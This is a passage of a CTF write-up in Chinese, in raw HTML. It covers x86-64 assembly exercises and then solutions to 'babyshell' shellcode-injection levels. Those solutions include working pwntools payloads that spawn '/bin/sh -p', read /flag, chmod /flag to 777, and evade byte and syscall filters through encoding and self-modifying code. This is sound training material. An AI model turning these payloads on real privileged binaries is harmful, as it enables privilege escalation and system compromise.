</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rbx</span><span class=p>,</span> <span class=mi>0x403000</span>
</span></span><span class=line><span class=cl><span class=nf>jmp</span> <span class=no>rbx</span>
</span></span></code></pre></div><h3 id=18-2 class="relative group">18 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#18-2 aria-label=锚点>#</a></span></h3><p>耐心算即可。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>ebx</span><span class=p>,</span> <span class=p>[</span><span class=no>rdi</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>eax</span><span class=p>,</span> <span class=p>[</span><span class=no>rdi</span><span class=err>+</span><span class=mi>4</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=p>[</span><span class=no>rdi</span><span class=err>+</span><span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>edx</span><span class=p>,</span> <span class=p>[</span><span class=no>rdi</span><span class=err>+</span><span class=mi>12</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>cmp</span> <span class=no>ebx</span><span class=p>,</span> <span class=mi>0x7f454c46</span>
</span></span><span class=line><span class=cl><span class=nf>je</span> <span class=no>.L2</span>
</span></span><span class=line><span class=cl><span class=nf>cmp</span> <span class=no>ebx</span><span class=p>,</span> <span class=mi>0x00005a4d</span>
</span></span><span class=line><span class=cl><span class=nf>je</span> <span class=no>.L3</span>
</span></span><span class=line><span class=cl><span class=nf>imul</span> <span class=no>eax</span><span class=p>,</span> <span class=no>ecx</span>
</span></span><span class=line><span class=cl><span class=nf>imul</span> <span class=no>eax</span><span class=p>,</span> <span class=no>edx</span>
</span></span><span class=line><span class=cl><span class=nf>jmp</span> <span class=no>.done</span>
</span></span><span class=line><span class=cl><span class=nl>.L2:</span>
</span></span><span class=line><span class=cl><span class=nf>add</span> <span class=no>eax</span><span class=p>,</span> <span class=no>ecx</span>
</span></span><span class=line><span class=cl><span class=nf>add</span> <span class=no>eax</span><span class=p>,</span> <span class=no>edx</span>
</span></span><span class=line><span class=cl><span class=nf>jmp</span> <span class=no>.done</span>
</span></span><span class=line><span class=cl><span class=nl>.L3:</span>
</span></span><span class=line><span class=cl><span class=nf>sub</span> <span class=no>eax</span><span class=p>,</span> <span class=no>ecx</span>
</span></span><span class=line><span class=cl><span class=nf>sub</span> <span class=no>eax</span><span class=p>,</span> <span class=no>edx</span>
</span></span><span class=line><span class=cl><span class=nl>.done:</span>
</span></span></code></pre></div><h3 id=19-2 class="relative group">19 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#19-2 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>cmp</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=nf>jle</span> <span class=no>.L2</span>
</span></span><span class=line><span class=cl><span class=nf>jmp</span> <span class=p>[</span><span class=no>rsi</span><span class=err>+</span><span class=mi>0x20</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nl>.L2:</span>
</span></span><span class=line><span class=cl><span class=nf>imul</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>0x8</span>
</span></span><span class=line><span class=cl><span class=nf>add</span> <span class=no>rdi</span><span class=p>,</span> <span class=no>rsi</span>
</span></span><span class=line><span class=cl><span class=nf>jmp</span> <span class=p>[</span><span class=no>rdi</span><span class=p>]</span>
</span></span></code></pre></div><h3 id=20-2 class="relative group">20 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#20-2 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>xor</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rax</span><span class=c1>;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>mov</span> <span class=no>rcx</span><span class=p>,</span> <span class=no>rsi</span><span class=c1>;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nl>.loop:</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>ebx</span><span class=p>,</span> <span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rdi</span><span class=p>]</span><span class=c1>;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>add</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rbx</span><span class=c1>;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>add</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>0x4</span><span class=c1>;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>dec</span> <span class=no>rcx</span><span class=c1>;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>jnz</span> <span class=no>.loop</span><span class=c1>;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>div</span> <span class=no>rsi</span>
</span></span></code></pre></div><h3 id=21-2 class="relative group">21 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#21-2 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>xor</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rax</span><span class=c1>;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nl>.loop:</span>
</span></span><span class=line><span class=cl><span class=nf>cmp</span> <span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rdi</span><span class=p>],</span> <span class=mi>0</span><span class=c1>;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>je</span> <span class=no>.done</span><span class=c1>;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>inc</span> <span class=no>rax</span><span class=c1>;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>inc</span> <span class=no>rdi</span><span class=c1>;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>jmp</span> <span class=no>.loop</span><span class=c1>;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nl>.done:</span>
</span></span></code></pre></div><h3 id=22-1 class="relative group">22 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#22-1 aria-label=锚点>#</a></span></h3><p>注意 <code>cmp</code> 时用 <code>BYTE PTR</code>，以及 <code>rax</code> 和 <code>rdi</code> 的上下文保存和恢复。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>xor</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rax</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rbx</span><span class=p>,</span> <span class=mi>0x403000</span>       <span class=c1># foo()
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>cmp</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>0</span>              <span class=c1># if src_addr != 0
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>je</span> <span class=no>.done</span>
</span></span><span class=line><span class=cl><span class=nl>.loop:</span>
</span></span><span class=line><span class=cl><span class=nf>cmp</span> <span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rdi</span><span class=p>],</span> <span class=mi>0</span>   <span class=c1># while [src_addr] != 0
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>je</span> <span class=no>.done</span>
</span></span><span class=line><span class=cl><span class=nf>cmp</span> <span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rdi</span><span class=p>],</span> <span class=mi>90</span>  <span class=c1># if [src_addr] &lt;= 90
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>jg</span> <span class=no>.fi</span>
</span></span><span class=line><span class=cl><span class=nf>push</span> <span class=no>rax</span>                <span class=c1># save rax
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>push</span> <span class=no>rdi</span>                <span class=c1># save rdi
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>mov</span> <span class=no>rdi</span><span class=p>,</span> <span class=p>[</span><span class=no>rdi</span><span class=p>]</span>          <span class=c1># arg1 &lt;- [src_addr]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>call</span> <span class=no>rbx</span>
</span></span><span class=line><span class=cl><span class=nf>pop</span> <span class=no>rdi</span>                 <span class=c1># restore rdi
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>mov</span> <span class=p>[</span><span class=no>rdi</span><span class=p>],</span> <span class=no>rax</span>          <span class=c1># [src_addr] &lt;- retval of foo()
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>pop</span> <span class=no>rax</span>                 <span class=c1># restore rax
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>inc</span> <span class=no>rax</span>
</span></span><span class=line><span class=cl><span class=nl>.fi:</span>
</span></span><span class=line><span class=cl><span class=nf>inc</span> <span class=no>rdi</span>                 <span class=c1># src_addr++
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>jmp</span> <span class=no>.loop</span>
</span></span><span class=line><span class=cl><span class=nl>.done:</span>
</span></span><span class=line><span class=cl><span class=nf>ret</span>
</span></span></code></pre></div><h3 id=23 class="relative group">23 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#23 aria-label=锚点>#</a></span></h3><p>注意用 rsp 寻址代替 rbp 寻址：<code>[rbp-x] == [rsp+x]</code>。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>push</span> <span class=no>rbp</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rbp</span><span class=p>,</span> <span class=no>rsp</span>
</span></span><span class=line><span class=cl><span class=nf>sub</span> <span class=no>rsp</span><span class=p>,</span> <span class=mi>0x100</span>              <span class=c1># 0 - 0xff
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nf>xor</span> <span class=no>rbx</span><span class=p>,</span> <span class=no>rbx</span>
</span></span><span class=line><span class=cl><span class=nl>.loop:</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>cl</span><span class=p>,</span> <span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rdi</span><span class=err>+</span><span class=no>rbx</span><span class=p>]</span>  <span class=c1># curr_byte = [src_addr + i]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>inc</span> <span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rsp</span><span class=err>+</span><span class=no>rcx</span><span class=p>]</span>      <span class=c1># [stack_base - curr_byte]++
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>inc</span> <span class=no>rbx</span>                     <span class=c1># i++
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>cmp</span> <span class=no>rbx</span><span class=p>,</span> <span class=no>rsi</span>                <span class=c1># for i &lt; size
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>jl</span> <span class=no>.loop</span>
</span></span><span class=line><span class=cl><span class=nf>xor</span> <span class=no>rbx</span><span class=p>,</span> <span class=no>rbx</span>                <span class=c1># b = 0
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nf>xor</span> <span class=no>rcx</span><span class=p>,</span> <span class=no>rcx</span>                <span class=c1># max_freq = 0
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>xor</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rax</span>                <span class=c1># max_freq_byte = 0
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nl>.loop2:</span>
</span></span><span class=line><span class=cl><span class=nf>cmp</span> <span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rsp</span><span class=err>+</span><span class=no>rbx</span><span class=p>],</span> <span class=no>cl</span>  <span class=c1># if [stack_base - b] &gt; max_freq
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>jle</span> <span class=no>.fi</span><span class=c1>;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>mov</span> <span class=no>cl</span><span class=p>,</span> <span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rsp</span><span class=err>+</span><span class=no>rbx</span><span class=p>]</span>  <span class=c1># max_freq = [stack_base - b]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rbx</span>                <span class=c1># max_freq_byte = b
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nl>.fi:</span>
</span></span><span class=line><span class=cl><span class=nf>inc</span> <span class=no>rbx</span>                     <span class=c1># b++
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>cmp</span> <span class=no>rbx</span><span class=p>,</span> <span class=mi>0xff</span>               <span class=c1># for b &lt;= 0xff
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>jle</span> <span class=no>.loop2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rsp</span><span class=p>,</span> <span class=no>rbp</span>
</span></span><span class=line><span class=cl><span class=nf>pop</span> <span class=no>rbp</span>                     <span class=c1># (mov rsp, rbp) + (pop rbp) = leave
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>ret</span>
</span></span></code></pre></div><h2 id=babyshell-shellcode-injection class="relative group">babyshell: Shellcode Injection <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#babyshell-shellcode-injection aria-label=锚点>#</a></span></h2><p>模版：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>binary</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>nop</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x90</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># TODO</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h3 id=1-2 class="relative group">1 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#1-2 aria-label=锚点>#</a></span></h3><p>ORW 方法:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># read(0, address of rip, 1000)</span>
</span></span><span class=line><span class=cl><span class=n>sc1</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>xor rax, rax
</span></span></span><span class=line><span class=cl><span class=s2>xor rdi, rdi
</span></span></span><span class=line><span class=cl><span class=s2>lea rsi, [rip]
</span></span></span><span class=line><span class=cl><span class=s2>mov rdx, 1000  # &lt;- rip
</span></span></span><span class=line><span class=cl><span class=s2>syscall        # sc2 comes after syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># orw</span>
</span></span><span class=line><span class=cl><span class=n>sc2</span> <span class=o>=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>readfile</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>nop</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc2</span><span class=p>))</span>
</span></span></code></pre></div><p>拿 Shell 方法:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># execve(&#34;/bin/sh\x00&#34;,[&#34;/bin/sh\x00&#34;, &#34;-p\x00\x00&#34;],NULL)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rax, 59                # execve
</span></span></span><span class=line><span class=cl><span class=s2>mov rbx, 0x68732f6e69622f  # &#34;/bin/sh&#34;
</span></span></span><span class=line><span class=cl><span class=s2>push rbx
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp               # rdi -&gt; &#34;/bin/sh&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>push 0x702d                # &#34;-p&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rcx, rsp               # rcx -&gt; &#34;-p&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>push 0
</span></span></span><span class=line><span class=cl><span class=s2>push rcx
</span></span></span><span class=line><span class=cl><span class=s2>push rdi
</span></span></span><span class=line><span class=cl><span class=s2>mov rsi, rsp               # rsi -&gt; [rdi, rcx, 0] on stack -&gt; [&#34;/bin/sh&#34;,&#34;-p&#34;,NULL]
</span></span></span><span class=line><span class=cl><span class=s2>mov rdx, 0                 # NULL
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>))</span>
</span></span></code></pre></div><h3 id=2-2 class="relative group">2 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#2-2 aria-label=锚点>#</a></span></h3><p>nop sled，沿用上题的 <code>sc</code>：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>nop</span><span class=o>*</span><span class=mh>0x800</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>))</span>
</span></span></code></pre></div><h3 id=3-2 class="relative group">3 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#3-2 aria-label=锚点>#</a></span></h3><p>编码去掉 NULL byte，沿用上题的 <code>sc</code>：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>encoder</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>),</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span></code></pre></div><h3 id=4-2 class="relative group">4 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#4-2 aria-label=锚点>#</a></span></h3><p>不能出现 <code>H</code> 字节，因此使用 32 位寄存器：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># read(0, address of rip, 1000)</span>
</span></span><span class=line><span class=cl><span class=n>sc1</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>xor eax, eax
</span></span></span><span class=line><span class=cl><span class=s2>xor edi, edi
</span></span></span><span class=line><span class=cl><span class=s2>lea esi, [rip]
</span></span></span><span class=line><span class=cl><span class=s2>mov edx, 1000  # &lt;- rip
</span></span></span><span class=line><span class=cl><span class=s2>syscall        # sc2 comes after syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># orw</span>
</span></span><span class=line><span class=cl><span class=n>sc2</span> <span class=o>=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>readfile</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>nop</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc2</span><span class=p>))</span>
</span></span></code></pre></div><h3 id=5-2 class="relative group">5 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#5-2 aria-label=锚点>#</a></span></h3><p>不能出现 syscall。syscall 是 <code>0f 05</code>，因此在最后加一句 <code>0e 05</code>，然后用 <code>inc BYTE PTR [rip]</code> 给最后一句加一变成 <code>syscall</code>。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># read(0, address of rip, 1000)</span>
</span></span><span class=line><span class=cl><span class=n>sc1</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>xor rax, rax
</span></span></span><span class=line><span class=cl><span class=s2>xor rdi, rdi
</span></span></span><span class=line><span class=cl><span class=s2>lea rsi, [rip]
</span></span></span><span class=line><span class=cl><span class=s2>mov rdx, 1000  # &lt;- rip
</span></span></span><span class=line><span class=cl><span class=s2>inc BYTE PTR [rip] # rip on next line, which is 0e 05
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># orw</span>
</span></span><span class=line><span class=cl><span class=n>sc2</span> <span class=o>=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>readfile</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc1</span><span class=p>)</span><span class=o>+</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x0e\x05</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>nop</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc2</span><span class=p>))</span>
</span></span></code></pre></div><h3 id=6-2 class="relative group">6 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#6-2 aria-label=锚点>#</a></span></h3><p>不能出现 syscall，而且禁止在 shellcode 前 4096 字节区域内的写操作。我直接跳了前 4096 字节然后用 5 的方法，暂时没有想到其他方法。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># read(0, address of rip, 1000)</span>
</span></span><span class=line><span class=cl><span class=n>sc1</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>.rept 4096
</span></span></span><span class=line><span class=cl><span class=s2>nop
</span></span></span><span class=line><span class=cl><span class=s2>.endr
</span></span></span><span class=line><span class=cl><span class=s2>xor rax, rax
</span></span></span><span class=line><span class=cl><span class=s2>xor rdi, rdi
</span></span></span><span class=line><span class=cl><span class=s2>lea rsi, [rip]
</span></span></span><span class=line><span class=cl><span class=s2>mov rdx, 1000  # &lt;- rip
</span></span></span><span class=line><span class=cl><span class=s2>inc BYTE PTR [rip] # rip on next line, which is 0e 05
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># orw</span>
</span></span><span class=line><span class=cl><span class=n>sc2</span> <span class=o>=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>readfile</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc1</span><span class=p>)</span><span class=o>+</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x0e\x05</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>nop</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc2</span><span class=p>))</span>
</span></span></code></pre></div><h3 id=7-2 class="relative group">7 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#7-2 aria-label=锚点>#</a></span></h3><p>关闭了 stdin，因此不能用上文 ORW 方法中的 multi-stage 方式读 shellcode 了；关闭了 stdout 和 stderr，因此没有回显。这里用的方法是通过 <code>chmod</code> 系统调用修改 <code>/flag</code> 权限，最后 <code>cat /flag</code> 即可。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># chmod(&#34;/flag&#34;, 777)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rax, 0x5a          # chmod
</span></span></span><span class=line><span class=cl><span class=s2>mov rbx, 0x67616c662f  # &#34;/flag&#34;
</span></span></span><span class=line><span class=cl><span class=s2>push rbx
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp           # rdi -&gt; &#34;/flag&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>mov rsi, 0x1ff         # 777 -&gt; 111 111 111
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>))</span>
